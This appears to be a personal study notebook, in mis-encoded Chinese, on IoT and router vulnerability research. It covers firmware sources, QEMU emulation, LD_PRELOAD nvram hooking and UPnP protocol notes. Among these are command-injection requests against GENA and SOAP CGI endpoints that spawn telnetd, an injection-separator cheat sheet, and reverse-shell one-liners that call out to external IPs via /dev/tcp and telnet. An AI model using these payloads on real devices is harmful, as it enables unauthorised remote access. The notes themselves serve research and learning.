---
title: IOT æ¼æ´æŒ–æ˜è®°å½•
date: 2023-04-24 00:28:59 +0800
categories: 
tags:
  - pwn
permalink: /posts/id=62/
pin: false
published:
---

ä¸»è¦æ˜¯åœ¨å­¦ä¹ çš„è¿‡ç¨‹ä¸­è®°å½•ä¸€äº›ç¬”è®°

## èµ„æºä¸‹è½½

å„å¤§å‚å•†çš„ä¸‹è½½åœ°å€

Tenda: https://www.tenda.com.cn/download/default.html

D-Link: 

https://tsd.dlink.com.tw/

https://support.dlink.com/

https://www.dlinktw.com.tw/techsupport/AllPro.aspx

TP-Link: https://resource.tp-link.com.cn/?source=index

åä¸º: https://support.huawei.com/enterprise/zh/software/index.html

NETGEAR/ç½‘ä»¶: http://support.netgear.cn/

ASUS/åç¡•: https://www.asus.com.cn/support/download-center/

cisco/æ€ç§‘: https://software.cisco.com/download/home

linksys/é¢†åŠ¿: https://www.linksys.com/linksys-support

H3C: http://www.h3c.com/cn/Service/Document_Software/Software_Download/

FASTè¿…æ·: https://service.fastcom.com.cn/download-list.html

æ°´æ˜Ÿ: https://service.mercurycom.com.cn/download-list.html

OpenWrt: https://downloads.openwrt.org/

æµ·åº·å¨è§†: https://www.hikvision.com/cn/support/Downloads/Device-upgrade-package/

**å®˜ç½‘æ²¡æœ‰å›ºä»¶ä¸‹è½½é“¾æ¥**

åˆ°ç¬¬ä¸‰æ–¹ä¸‹è½½ https://drivers.mydrivers.com/s-0-0/h0-0-0-0-3-1-1.htm

å°ç±³: https://xiaomifirmwareupdater.com/ã€https://mirom.ezbox.idv.tw/en/

Cisco/æ€ç§‘: https://doc.lagout.org/network/Cisco/


```Bash
armel:
# 3.2.0
wget https://people.debian.org/~aurel32/qemu/armel/debian_wheezy_armel_standard.qcow2
wget https://people.debian.org/~aurel32/qemu/armel/initrd.img-3.2.0-4-versatile
wget https://people.debian.org/~aurel32/qemu/armel/vmlinuz-3.2.0-4-versatile
# 2.6.32
wget https://people.debian.org/~aurel32/qemu/armel/debian_squeeze_armel_standard.qcow2
wget https://people.debian.org/~aurel32/qemu/armel/initrd.img-2.6.32-5-versatile
wget https://people.debian.org/~aurel32/qemu/armel/vmlinuz-2.6.32-5-versatile

armhf:
# 3.2.0
wget https://people.debian.org/~aurel32/qemu/armhf/debian_wheezy_armhf_standard.qcow2
wget https://people.debian.org/~aurel32/qemu/armhf/initrd.img-3.2.0-4-vexpress
wget https://people.debian.org/~aurel32/qemu/armhf/vmlinuz-3.2.0-4-vexpress

mipsel:
# 3.2.0
wget https://people.debian.org/~aurel32/qemu/mipsel/debian_wheezy_mipsel_standard.qcow2
wget https://people.debian.org/~aurel32/qemu/mipsel/vmlinux-3.2.0-4-4kc-malta

# 2.6.32
wget https://people.debian.org/~aurel32/qemu/mipsel/debian_squeeze_mipsel_standard.qcow2
wget https://people.debian.org/~aurel32/qemu/mipsel/vmlinux-2.6.32-5-4kc-malta

mips:
# 3.2.0
wget https://people.debian.org/~aurel32/qemu/mips/debian_wheezy_mips_standard.qcow2
wget https://people.debian.org/~aurel32/qemu/mips/vmlinux-3.2.0-4-4kc-malta

# 2.6.32
wget https://people.debian.org/~aurel32/qemu/mips/debian_squeeze_mips_standard.qcow2
wget https://people.debian.org/~aurel32/qemu/mips/vmlinux-2.6.32-5-4kc-malta
```


## é»‘å®¢ğŸ‘´


è¿‘æºæ¸—é€

https://tttang.com/archive/1888/#toc_wifi_1

wifipumpkin3

https://www.freebuf.com/sectool/265288.html

https://www.addx.top/2023/06/30/wifi%E9%92%93%E9%B1%BC%E7%9A%84%E4%B8%80%E4%B8%AA%E5%B0%8F%E9%97%AE%E9%A2%98/

https://lnng.top/posts/8b06.html#toc-heading-2







https://www.cnblogs.com/xs-xs/p/16329075.html

DHCP

https://blog.csdn.net/zegeai/article/details/109760837



## IOTçŸ¥è¯†å­¦ä¹ ğŸ“•

### åŠ å¯†å›ºä»¶å¤„ç†


### patch & hook

HOOKä¸€å…±æœ‰å››ç§æ–¹æ³•ï¼Œåˆ†åˆ«æ˜¯

+ LD_PRELOAD
+ dl_open
+ LD_LIBRARY_PATH
+ ç›´æ¥é’ˆå¯¹äºŒè¿›åˆ¶æ–‡ä»¶çš„patch

```shell
# æŸ¥çœ‹libc ä¿¡æ¯
cp $(which qemu-arm-static) .
sudo chroot . ./qemu-arm-static /lib/libc.so.6
or
strings ./lib/libc.so.0 | grep uClibc
```
### dl_open

```
mv libnvram.so libnvram_orig.so

```



### LD_PRELOAD

```shell
# glibc/eglibcç¼–è¯‘ 
arm-linux-gnueabi-gcc -shared -fPIC hook.c -o hook.so 


# uclibc ç¼–è¯‘
cd ~/am-toolchains/brcm-arm-sdk/
export LD_LIBRARY_PATH="$PWD/hndtools-arm-linux-2.6.36-uclibc-4.5.3/lib"
# åŸºäº nvram_fake
./hndtools-arm-linux-2.6.36-uclibc-4.5.3/bin/arm-uclibc-gcc -c -O2 -fPIC -Wall /home/ef4tless/nvram-faker/custom_nvram_r6250.c -o /home/ef4tless/nvram-faker/custom_nvram_r6250.o

./hndtools-arm-linux-2.6.36-uclibc-4.5.3/bin/arm-uclibc-gcc -shared -nostdlib /home/ef4tless/nvram-faker/custom_nvram_r6250.o -o /home/ef4tless/nvram-faker/custom_nvram_r6250.so

# åŸºäº libnvram
./hndtools-arm-linux-2.6.36-uclibc-4.5.3/bin/arm-uclibc-gcc -c -O2 -fPIC -Wall /home/ef4tless/libnvram/nvram.c -o /home/ef4tless/libnvram/firmadyne_nvram.o

./hndtools-arm-linux-2.6.36-uclibc-4.5.3/bin/arm-uclibc-gcc -shared -nostdlib /home/ef4tless/libnvram/firmadyne_nvram.o -o /home/ef4tless/libnvram/firmadyne_libnvram.so


# ä¸Šä¼ 
scp ./hook.so root@192.168.2.2:/root/rootfs/

scp ./mini_httpd root@192.168.2.2:/root/rootfs/usr/sbin
```



```shell
# è¿è¡Œ
LD_PRELOAD=./hook.so ./usr/sbin/mini_httpd
# æ³¨å…¥ç¯å¢ƒå˜é‡
export LD_PRELOAD=./hook.so


# qemu usr mode / straceè¿½è¸ª
sudo chroot . ./qemu-arm-static ./usr/sbin/upnpd
sudo chroot . ./qemu-arm-static -strace ./usr/sbin/upnpd

sudo chroot . ./qemu-arm-static -E LD_PRELOAD="./custom_nvram_r6250.so ./lib/libdl.so.0" /usr/sbin/upnpd

sudo chroot . ./qemu-arm-static -E LD_PRELOAD="/firmadyne_libnvram.so" ./usr/sbin/upnpd



# æŸ¥çœ‹å¯åŠ¨ç«¯å£
sudo lsof -i | grep qemu


# æŒ‰å­—ç¬¦ä¸²æœç´¢
cd rootfs
grep -r "mini_httpd" ./

```




```shell
# start.sh

mipsel:
qemu-system-mipsel -M malta -kernel vmlinux-3.2.0-4-4kc-malta \
    -hda debian_wheezy_mipsel_standard.qcow2 \
    -append "root=/dev/sda1 console=tty0" \
    -netdev tap,id=tapnet,ifname=tap0,script=no \
    -device rtl8139,netdev=tapnet -nographic
    
mips:
qemu-system-mips -M malta -kernel vmlinux-3.2.0-4-4kc-malta \
    -hda debian_wheezy_mips_standard.qcow2 \
    -append "root=/dev/sda1 console=tty0" \
    -netdev tap,id=tapnet,ifname=tap0,script=no \
    -device rtl8139,netdev=tapnet -nographic
    
armel:
qemu-system-arm \
    -M versatilepb \
    -kernel vmlinuz-3.2.0-4-versatile \
    -initrd initrd.img-3.2.0-4-versatile \
    -hda debian_wheezy_armel_standard.qcow2 \
    -append "root=/dev/sda1" -net nic \
    -net tap,ifname=tap0,script=no,downscript=no \
    -nographic

armhf:
qemu-system-arm -M vexpress-a9 -kernel vmlinuz-3.2.0-4-vexpress \
    -initrd initrd.img-3.2.0-4-vexpress \
    -drive if=sd,file=debian_wheezy_armhf_standard.qcow2 \
    -append "root=/dev/mmcblk0p2" -net nic \ 
    -net tap,ifname=tap0,script=no,downscript=no -nographic
    
arm64:
```



GDBè°ƒè¯•

```
# gdbserver


gdb







```



### æŒ–æ˜æŠ€å·§tipså’ŒçŸ¥è¯†ç‚¹

```sh
sudo vim /etc/ssh/sshd_config
PasswordAuthenticationæ”¹æˆyes

vsnprintf(str, 0x400u, format, va);
æŒ‰ç…§formatçš„æ ¼å¼ï¼ˆ%sï¼‰ï¼Œå°†vaä¼ å…¥str

ä¾‹å¦‚ vaæ˜¯æ ˆä¸Šåˆ—è¡¨/formatä¸º%S %S %S
+0000000C filename:.word ?
+00000010 re_addr:.word ?
+00000014 re_port:.word ?

strä¸º filename re_addr re_port

idaæŸ¥æ‰¾å­—æ®µ Alt+t

fopenå‡½æ•°çš„modeå‚æ•°æœ‰ä»¥ä¸‹å‡ ç§ï¼š
"r"ï¼šä»¥åªè¯»æ–¹å¼æ‰“å¼€æ–‡ä»¶ã€‚æ–‡ä»¶å¿…é¡»å­˜åœ¨ï¼Œå¦åˆ™æ‰“å¼€å¤±è´¥ã€‚
"w"ï¼šä»¥å†™æ–¹å¼æ‰“å¼€æ–‡ä»¶ã€‚å¦‚æœæ–‡ä»¶ä¸å­˜åœ¨ï¼Œåˆ™åˆ›å»ºæ–‡ä»¶ï¼›å¦‚æœæ–‡ä»¶å·²å­˜åœ¨ï¼Œåˆ™æ¸…ç©ºæ–‡ä»¶å†…å®¹ã€‚
"a"ï¼šä»¥è¿½åŠ æ–¹å¼æ‰“å¼€æ–‡ä»¶ã€‚å¦‚æœæ–‡ä»¶ä¸å­˜åœ¨ï¼Œåˆ™åˆ›å»ºæ–‡ä»¶ï¼›å¦‚æœæ–‡ä»¶å·²å­˜åœ¨ï¼Œåˆ™åœ¨æ–‡ä»¶æœ«å°¾è¿½åŠ å†…å®¹ã€‚
"r+"ï¼šä»¥è¯»å†™æ–¹å¼æ‰“å¼€æ–‡ä»¶ã€‚æ–‡ä»¶å¿…é¡»å­˜åœ¨ï¼Œå¦åˆ™æ‰“å¼€å¤±è´¥ã€‚
"w+"ï¼šä»¥è¯»å†™æ–¹å¼æ‰“å¼€æ–‡ä»¶ã€‚å¦‚æœæ–‡ä»¶ä¸å­˜åœ¨ï¼Œåˆ™åˆ›å»ºæ–‡ä»¶ï¼›å¦‚æœæ–‡ä»¶å·²å­˜åœ¨ï¼Œåˆ™æ¸…ç©ºæ–‡ä»¶å†…å®¹ã€‚
"a+"ï¼šä»¥è¯»å†™æ–¹å¼æ‰“å¼€æ–‡ä»¶ã€‚å¦‚æœæ–‡ä»¶ä¸å­˜åœ¨ï¼Œåˆ™åˆ›å»ºæ–‡ä»¶ï¼›å¦‚æœæ–‡ä»¶å·²å­˜åœ¨ï¼Œåˆ™åœ¨æ–‡ä»¶æœ«å°¾è¿½åŠ å†…å®¹ã€‚
é™¤äº†ä»¥ä¸Šå…­ç§æ¨¡å¼å¤–ï¼Œè¿˜å¯ä»¥åœ¨æ¨¡å¼å­—ç¬¦ä¸²ä¸­æ·»åŠ "b"å­—ç¬¦ï¼Œè¡¨ç¤ºä»¥äºŒè¿›åˆ¶æ–¹å¼æ‰“å¼€æ–‡ä»¶ã€‚ä¾‹å¦‚ï¼Œ"rb"è¡¨ç¤ºä»¥åªè¯»æ–¹å¼æ‰“å¼€äºŒè¿›åˆ¶æ–‡ä»¶ã€‚

bashè„šæœ¬`ls`å‘½ä»¤æ‰§è¡Œ
ä½¿ç”¨ && è¿æ¥ä¸¤ä¸ªå‘½ä»¤æ—¶ï¼Œç¬¬äºŒä¸ªå‘½ä»¤åªæœ‰åœ¨ç¬¬ä¸€ä¸ªå‘½ä»¤æˆåŠŸæ‰§è¡Œï¼ˆå³è¿”å›çŠ¶æ€ç ä¸º0ï¼‰ä¹‹åæ‰ä¼šæ‰§è¡Œ

ç”¨FAPå¯åŠ¨å¥½å›ºä»¶åï¼Œéœ€è¦ç”¨echo 0 > /proc/sys/kernel/randomize_va_spaceå‘½ä»¤å…³é—­åœ°å€éšæœºåŒ–ï¼ˆASLRï¼‰

# åœ¨å½“å‰ç›®å½•æŸ¥æ‰¾
grep -r "CVE-2022-45511" ./
```



hnap

upnp

```
cgibinä¼šä½œä¸º â€œè¯·æ±‚éªŒè¯æ–‡ä»¶â€ ï¼Œå¯¹ç”¨æˆ·çš„è¯·æ±‚è¿›è¡ŒéªŒè¯å¹¶è§£æï¼Œå†å°†è§£æåçš„æ•°æ®ä¼ ç»™å¯¹åº”çš„æ–‡ä»¶ï¼Œè¿›è¡Œä¸‹ä¸€æ­¥çš„æ“ä½œã€‚

SSDPï¼ˆç®€å•æœåŠ¡å‘ç°åè®®ï¼‰ï¼ŒSOAPï¼ˆç®€å•å¯¹è±¡è®¿é—®åè®®ï¼‰ä¸GENAï¼ˆé€šç”¨äº‹ä»¶é€šçŸ¥ä½“ç³»ï¼‰ ï¼Œå…¶åˆ†åˆ«å¯¹åº”ssdpcgiï¼ˆåœ¨/htdocs/upnpç›®å½•ä¸‹ï¼‰ï¼Œsoap.cgiï¼ˆåœ¨/htdocs/upnp/docs/LAN-1ç›®å½•ä¸‹ï¼‰ï¼Œgena.cgiï¼ˆåœ¨/htdocs/upnp/docs/LAN-1ç›®å½•ä¸‹ï¼‰


/usr/sbin/upnp ä¸­åˆ™åŒ…å«äº†è¯·æ±‚è§„åˆ™
```

SSDP

```
è°ƒç”¨ç«¯å£æŸ¥è¯¢
/var/run/httpd.conf



# ç§°ä¸ºHTTPUåè®®ï¼ˆå³åŸºäºUDPçš„HTTPï¼‰


M-SEARCH * HTTP / 1.1  
hostï¼š239.255.255.250 ï¼š1900  
MANï¼šssdpï¼šdiscover  
MXï¼š10  
STï¼šssdp:all

UUID
Universally Unique Identifierï¼Œé€šç”¨å”¯ä¸€è¯†åˆ«ç ã€‚ç›®çš„æ˜¯è®©åˆ†å¸ƒå¼ç³»ç»Ÿä¸­çš„æ‰€æœ‰å…ƒç´ ï¼Œéƒ½æœ‰å”¯ä¸€è¾¨è¯†å’¨è¯¢ï¼Œå®šä¹‰æ ¼å¼ä¸ºï¼šxxxxxxxx-xxxx-xxxx-xxxxxxxxxxxxxxxx(8-4-4-16),åˆ†åˆ«ä¸ºå½“å‰æ—¥æœŸå’Œæ—¶é—´ï¼Œæ—¶é’Ÿåºåˆ—ï¼Œå…¨å±€å”¯ä¸€çš„IEEEæœºå™¨è¯†åˆ«å·ï¼Œå¦‚æœæœ‰ç½‘å¡ï¼Œä»ç½‘å¡macåœ°å€è·å¾—ï¼Œæ²¡æœ‰ç½‘å¡ä»¥å…¶ä»–æ–¹å¼è·å¾—ã€‚
UDN
å•ä¸€è®¾å¤‡åï¼ˆUnique Device Nameï¼‰ï¼ŒåŸºäºUUIDï¼Œè¡¨ç¤ºä¸€ä¸ªè®¾å¤‡ã€‚åœ¨ä¸åŒçš„æ—¶é—´ï¼Œå¯¹äºåŒä¸€ä¸ªè®¾å¤‡æ­¤å€¼åº”è¯¥æ˜¯å”¯ä¸€çš„ã€‚
URN
URLçš„ä¸€ç§æ›´æ–°å½¢å¼ï¼Œç»Ÿä¸€èµ„æºåç§°(URN,Uniform Resource Name)ã€‚å”¯ä¸€æ ‡è¯†ä¸€ä¸ªå®ä½“çš„æ ‡è¯†ç¬¦ï¼Œä½†æ˜¯ä¸èƒ½ç»™å‡ºå®ä½“çš„ä½ç½®ã€‚æ ‡è¯†æŒä¹…æ€§Internetèµ„æºã€‚URNå¯ä»¥æä¾›ä¸€ç§æœºåˆ¶ï¼Œç”¨äºæŸ¥æ‰¾å’Œæ£€ç´¢å®šä¹‰ç‰¹å®šå‘½åç©ºé—´çš„æ¶æ„æ–‡ä»¶ã€‚å°½ç®¡æ™®é€šçš„URLå¯ä»¥æä¾›ç±»ä¼¼çš„åŠŸèƒ½ï¼Œä½†æ˜¯åœ¨è¿™æ–¹é¢ï¼ŒURN æ›´åŠ å¼ºå¤§å¹¶ä¸”æ›´å®¹æ˜“ç®¡ç†ï¼Œå› ä¸º URN å¯ä»¥å¼•ç”¨å¤šä¸ª URLã€‚
Mx
1åˆ°5ä¹‹é—´çš„ä¸€ä¸ªå€¼ï¼Œè¡¨ç¤ºæœ€å¤§çš„ç­‰å¾…åº”ç­”çš„ç§’æ•°ã€‚
ST
Seatch Targerï¼Œè¡¨ç¤ºæœç´¢çš„èŠ‚ç‚¹ç±»å‹ã€‚

# åº”ç­”
HTTP/1.1 200 OK\r\n
CACHE-CONTROL: max-age=120\r\n
ST: uuid:75802409-bccb-40e7-8e6c-40a5ef100e92\r\n
USN: uuid:75802409-bccb-40e7-8e6c-40a5ef100e92\r\n
EXT:\r\n
SERVER: RT-N56U/3.4.3.9 UPnP/1.1 MiniUPnPd/2.0\r\n
LOCATION: http://192.168.100.1:24795/rootDesc.xml\r\n
OPT: "http://schemas.upnp.org/upnp/1/0/"; ns=01\r\n
01-NLS: 1652586384\r\n
BOOTID.UPNP.ORG: 1652586384\r\n
CONFIGID.UPNP.ORG: 1337\r\n
\r\n
```

gena

```
SUBCRIBE

request = b"SUBSCRIBE /gena.cgi?service=" + b"`telnetd -p 7777`" + b" HTTP/1.1\r\n"
request += b"Host: localhost:49152\r\n"
request += b"Callback: http:///\r\n"
request += b"NT: upnp:event\r\n"
request += b"Timeout: Second-2333\r\n\r\n"
service=åé¢çš„å†…å®¹ï¼Œå†å…ˆçœ‹åˆ°SUBCRIBEè¯·æ±‚æ–¹å¼å¯¹åº”çš„sub_41A390å‡½æ•°ï¼š
```



soap

```
from socket import *
from os import *
from time import *
 
request = b"POST /soap.cgi?service=&&telnetd -p 8888&& HTTP/1.1\r\n"
request += b"Host: localhost:49152\r\n"
request += b"Content-Type: text/xml\r\n"
request += b"Content-Length: 88\r\n"
request += b"SOAPAction: a#b\r\n\r\n"
```



### åŸºç¡€çŸ¥è¯†

windows dnsåˆ·æ–°

```shell
ipconfig /flushdns
```





### ç½‘ç»œç¼–ç¨‹

å‚è€ƒï¼šhttps://nuoye-blog.github.io/2020/05/20/6e2d1109/

`socket(2, 2, 0)` 
è°ƒç”¨åˆ›å»ºäº†ä¸€ä¸ªIPv4(AF_INETï¼Œå› ä¸ºç¬¬ä¸€ä¸ªå‚æ•°æ˜¯2)çš„æµå¼å¥—æ¥å­—(SOCK_STREAMï¼Œå› ä¸ºç¬¬äºŒä¸ªå‚æ•°æ˜¯2)ï¼Œç¬¬ä¸‰ä¸ªå‚æ•°æŒ‡å®šçš„æ˜¯ä½¿ç”¨é»˜è®¤çš„åè®®(é€šå¸¸æ˜¯TCP)ã€‚

bindç»‘å®šåˆ°servaddrï¼Œç›¸åº”çš„IPç«¯å£

```c
bind(socket_fd, (struct sockaddr*)&servaddr, sizeof(servaddr)
```

listenç›‘å¬ç«¯å£

```C
listen(socket_fd, 10)
```



connectç”¨äºè¿æ¥åˆ°æŒ‡å®šservaddrçš„

```c
connect(socket_fd, (struct sockaddr*)&servaddr, sizeof(servaddr)
```









` 0x7F000001` è¡¨ç¤ºä½¿ç”¨å›ç¯åœ°å€(127.0.0.1)





### ç—…æ¯’åˆ†æ

| Sha256   | 81f67502d9cf92a9ff03b2f3837ae1cdda7db8e9624ad82106723b520c43fe5a |
| -------- | ------------------------------------------------------------ |
| SHA1     | cc7af791ac2a977d5d6a4609fc4438085d0becd5                     |
| MD5      | 63374c5d751d2648c578b46eb6573958                             |
| æ–‡ä»¶ç±»å‹ | EXE                                                          |
| æ–‡ä»¶å¤§å° | 24.65MB                                                      |
| æ–‡ä»¶åç§° | é›†å›¢ç»ˆç«¯è‡ªæ£€å·¥å…·ç¬¬ä¸€ç‰ˆ.exe                                   |
| åŠŸèƒ½æè¿° | Sliveræœ¨é©¬                                                   |
| æŠ€æœ¯ç‰¹ç‚¹ | ç»åˆ†æè¯¥æœ¨é©¬æ˜¯ä¸€ä¸ªåŠ å£³çš„Sliverã€‚                             |

### å‘½ä»¤æ³¨å…¥

#### å¸¸è§å±é™©å‡½æ•°
php
- system
- exec
- passthru
- shell_exec
- popen
- proc_open

python
- system
- popen
- subprocess.call
- spawn

java
- java.lang.Runtime.getRuntime().exec(command)



#### å¯æ³¨å…¥åˆ†å‰²ç¬¦å’Œæ³¨å…¥å‘½ä»¤

__å•å¼•å·è¦é—­åˆ__! å› ä¸ºå•å¼•å·ä¸­ï¼Œ\`\` å’Œ $ å’Œ ï¼›ä¸ä¼šè¢«è¯†åˆ«æ‰§è¡Œï¼ŒåŒå¼•å·åˆ†å·è¯†åˆ«ä¸äº†


```shell
#  å¯æ³¨å…¥åˆ†å‰²ç¬¦
%0a
%0d 
;
&
|
$(shell_command)
`shell_command`
{shell_command,}
```

1ã€åˆ†å·`;`åˆ†å‰²


2ã€`||` `&&` `&` `|`åˆ†å‰²

  ||(æˆ–è€…)å½“å‰é¢çš„æ‰§è¡Œå‡ºé”™æ—¶æ‰§è¡Œåé¢çš„

  &&(å’Œ)å½“å‰ä¸€æ¡å‘½ä»¤æ‰§è¡ŒæˆåŠŸåé¢çš„å‘½ä»¤æ‰ä¼šæ‰§è¡Œ

  &å°†å‰è¾¹çš„å‘½ä»¤æ”¾åœ¨åå°æ‰§è¡Œ
  
  | ç®¡é“ç¬¦  æ˜¾ç¤ºåé¢çš„å‘½ä»¤çš„æ‰§è¡Œç»“æœ

3ã€`\r\n` `%0d%a0` æ¢è¡Œ

ä¸»è¦ç”¨äºæŠ¥æ–‡é‡Œæ‹¼æ¥
%0a å³ \n
%0d å³ \r

4ã€åå¼•å·è§£æå’Œ `$()` æ›¿æ¢

å¦‚æœåœ¨ä¸€æ¡å‘½ä»¤ä¸­å‡ºç°äº†åå¼•å·ï¼Œç³»ç»Ÿä¼šé¦–å…ˆæ‰§è¡Œåå¼•å·å†…çš„å‘½ä»¤ï¼Œç„¶åå°†æ‰§è¡Œç»“æœä½œä¸ºxclibcçš„å‚æ•°

5ã€é¢å¤–çš„ä¸€äº›æ‹¼æ¥

åŒå¤§æ‹¬å·å­—ç¬¦ç»„åˆè¾“å‡º

cat {./te,st}{st,st}
to
./test test stst stst

\> ç”¨äºé‡å®šå‘ï¼Œå¦‚æœç›®æ ‡æ–‡ä»¶å·²ç»å­˜åœ¨åˆ™è¦†ç›–å…¶ä¸­çš„å†…å®¹


æ³¨å…¥å‘½ä»¤
```shell

wget dnslog.cn

telnetd

sh -c "sh -i >& /dev/tcp/150.158.144.112/1234 0>&1"\x00

```

telnetåå¼¹ï¼Œé˜²æ­¢æ²¡æœ‰telnetd

```shell
'$(mkfifo /tmp/test;telnet 192.168.45.66 6666 0</tmp/test|/bin/sh > /tmp/test)'
```

### æ­£åˆ™åˆ†æ

```php
$reg = "/^(http(s?):\/\/){0,1}(?:[A-za-z0-9-]+\.)+[A-Za-z]{2,4}(?:[\/\?#][\/=\?%\-&~`@[\]\':+!\.#\w]*)?$/";
```

1. **å®šç•Œç¬¦**ï¼š

   - æ­£åˆ™è¡¨è¾¾å¼é€šå¸¸è¢«å®šç•Œç¬¦åŒ…å›´ï¼Œè¿™é‡Œä½¿ç”¨çš„æ˜¯æ­£æ–œçº¿ `/`ã€‚å®šç•Œç¬¦å¯ä»¥æ˜¯ä»»æ„éå­—æ¯æ•°å­—ã€éåæ–œçº¿ã€éç©ºç™½å­—ç¬¦ã€‚

2. **å¼€å§‹ (`^`) å’Œç»“æŸ (`$`) é”šç‚¹**ï¼š

   - `^` è¡¨ç¤ºæ­£åˆ™è¡¨è¾¾å¼åº”è¯¥ä»å­—ç¬¦ä¸²çš„å¼€å§‹å¤„å¼€å§‹åŒ¹é…ã€‚
   - `$` è¡¨ç¤ºæ­£åˆ™è¡¨è¾¾å¼åº”è¯¥åœ¨å­—ç¬¦ä¸²çš„ç»“å°¾å¤„ç»“æŸã€‚
   - è¿™ä¸¤ä¸ªç¬¦å·ç¡®ä¿æ•´ä¸ªå­—ç¬¦ä¸²å®Œå…¨ç¬¦åˆæ­£åˆ™è¡¨è¾¾å¼çš„æ¨¡å¼ã€‚

3. **åè®®åŒ¹é…**ï¼š

   - `(http(s?):\/\/){0,1}` ç”¨äºåŒ¹é… URL çš„åè®®éƒ¨åˆ†ã€‚
   - `http` åé¢çš„ `(s?)` è¡¨ç¤º 's' å­—ç¬¦å¯æœ‰å¯æ— ï¼Œç”¨äºåŒ¹é… 'http' æˆ– 'https'ã€‚
   - `:\/\/` æ˜¯å¯¹å†’å·å’Œä¸¤ä¸ªæ­£æ–œçº¿çš„ç›´æ¥åŒ¹é…ã€‚
   - `{0,1}` è¡¨ç¤ºå‰é¢çš„æ•´ä¸ªæ¨¡å¼å¯ä»¥å‡ºç° 0 æ¬¡æˆ– 1 æ¬¡ã€‚

4. **åŸŸååŒ¹é…**ï¼š

   - `(?:[A-Za-z0-9-]+\.)+` åŒ¹é…åŸŸåã€‚
   - `[A-Za-z0-9-]+` åŒ¹é…ä¸€ä¸ªæˆ–å¤šä¸ªå­—æ¯ã€æ•°å­—æˆ–è¿å­—ç¬¦ã€‚
   - `\.` åŒ¹é…ç‚¹å·ï¼ˆ`.`ï¼‰ã€‚åœ¨æ­£åˆ™è¡¨è¾¾å¼ä¸­ï¼Œç‚¹å·é€šå¸¸è¡¨ç¤ºä»»æ„å­—ç¬¦ï¼Œæ‰€ä»¥éœ€è¦ç”¨åæ–œçº¿è½¬ä¹‰ã€‚
   - åé¢çš„ `+` è¡¨ç¤ºå‰é¢çš„æ¨¡å¼ï¼ˆå³ä¸€ä¸ªæ ‡ç­¾ï¼Œå¦‚ `example`ï¼‰å¯ä»¥å‡ºç°ä¸€æ¬¡æˆ–å¤šæ¬¡ã€‚

5. **é¡¶çº§åŸŸååŒ¹é…**ï¼š

   - `[A-Za-z]{2,4}` åŒ¹é…é¡¶çº§åŸŸåï¼ˆå¦‚ `.com`ã€`.net`ï¼‰ã€‚
   - `{2,4}` è¡¨ç¤ºå‰é¢çš„å­—ç¬¦æ¨¡å¼è‡³å°‘å‡ºç° 2 æ¬¡ï¼Œæœ€å¤šå‡ºç° 4 æ¬¡ã€‚

6. **å¯é€‰çš„ URL éƒ¨åˆ†**ï¼š

   - `(?:[\/\?#][\/=\?%\-&~`@[]':+!.#\w]*)?` ç”¨äºåŒ¹é… URL çš„è·¯å¾„ã€æŸ¥è¯¢å‚æ•°ç­‰å¯é€‰éƒ¨åˆ†ã€‚
   - `[\/\?#]` é¦–å…ˆåŒ¹é…ä¸€ä¸ªæ­£æ–œçº¿ã€é—®å·æˆ–äº•å·ã€‚
   - åé¢çš„éƒ¨åˆ† `[\/=\?%\-&~`@[]':+!.#\w]*` åŒ¹é… URL ä¸­å¯èƒ½å‡ºç°çš„å„ç§å­—ç¬¦ï¼ŒåŒ…æ‹¬æ–œçº¿ã€ç­‰å·ã€ç™¾åˆ†å·ã€è¿å­—ç¬¦ç­‰ã€‚
   - `*` è¡¨ç¤ºå‰é¢çš„æ¨¡å¼å¯ä»¥å‡ºç°ä»»æ„æ¬¡ï¼ŒåŒ…æ‹¬é›¶æ¬¡ã€‚
   - æœ€åçš„ `?` è¡¨ç¤ºè¿™æ•´ä¸ªéƒ¨åˆ†æ˜¯å¯é€‰çš„ã€‚

   

1. **åˆ†ç»„** (`()`):
   - åœ¨æ­£åˆ™è¡¨è¾¾å¼ä¸­ï¼Œåœ†æ‹¬å·ç”¨äºåˆ›å»ºåˆ†ç»„ã€‚è¿™å…è®¸æ‚¨å°†å¤šä¸ªå­—ç¬¦æˆ–è¡¨è¾¾å¼ç»„åˆåœ¨ä¸€èµ·ï¼Œä»¥ä¾¿å¯¹æ•´ä¸ªç»„æ‰§è¡Œæ“ä½œï¼ˆå¦‚é‡å¤ã€åŒ¹é…ç­‰ï¼‰ã€‚
   - åˆ†ç»„è¿˜æœ‰ä¸€ä¸ªé™„åŠ åŠŸèƒ½ï¼šå®ƒä»¬å¯ä»¥æ•è·åŒ¹é…çš„å†…å®¹ï¼Œè¿™æ„å‘³ç€æ‚¨å¯ä»¥åœ¨æ­£åˆ™è¡¨è¾¾å¼çš„å…¶ä½™éƒ¨åˆ†æˆ–è€…åœ¨æ›¿æ¢æ“ä½œä¸­å¼•ç”¨è¿™éƒ¨åˆ†åŒ¹é…çš„æ–‡æœ¬ã€‚
2. **éæ•è·åˆ†ç»„** (`(?:...)`):
   - æœ‰æ—¶å€™ï¼Œæ‚¨åªéœ€è¦åˆ†ç»„çš„ç»„åˆåŠŸèƒ½ï¼Œè€Œä¸éœ€è¦æ•è·åŠŸèƒ½ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå°±å¯ä»¥ä½¿ç”¨éæ•è·åˆ†ç»„ã€‚
   - åœ¨åˆ†ç»„çš„å¼€å§‹åŠ ä¸Š `?:`ï¼ˆç´§è·Ÿåœ¨å·¦åœ†æ‹¬å·åé¢ï¼‰æ¥åˆ›å»ºä¸€ä¸ªéæ•è·åˆ†ç»„ã€‚è¿™æ ·ï¼Œæ­£åˆ™è¡¨è¾¾å¼å¼•æ“å°±ä¸ä¼šä¿å­˜è¿™ä¸ªåˆ†ç»„åŒ¹é…çš„å†…å®¹ï¼Œä»è€ŒèŠ‚çœèµ„æºã€‚

åœ¨æ­£åˆ™è¡¨è¾¾å¼ä¸­ï¼Œ`\w` åŒ¹é…ä»»ä½•å­—æ¯æ•°å­—å­—ç¬¦ï¼ŒåŒ…æ‹¬ä¸‹åˆ’çº¿ã€‚è¿™æ„å‘³ç€å®ƒåŒ¹é…æ‰€æœ‰çš„å°å†™å’Œå¤§å†™å­—æ¯ï¼ˆa-z, A-Zï¼‰ã€æ•°å­—ï¼ˆ0-9ï¼‰ä»¥åŠä¸‹åˆ’çº¿ï¼ˆ\_ï¼‰ã€‚



## è·¯ç”±å™¨ä¸€ç¯®å­æµç¨‹ğŸ„


ç»Ÿè®¡æ‰€æœ‰æ¥å£


lua luciæ¡†æ¶æœç´¢è·¯ç”±

```shell
grep -Rs "entry({\"api"
```

å±é™©å‡½æ•°

```shell
os.execute, forkExec, io.popen
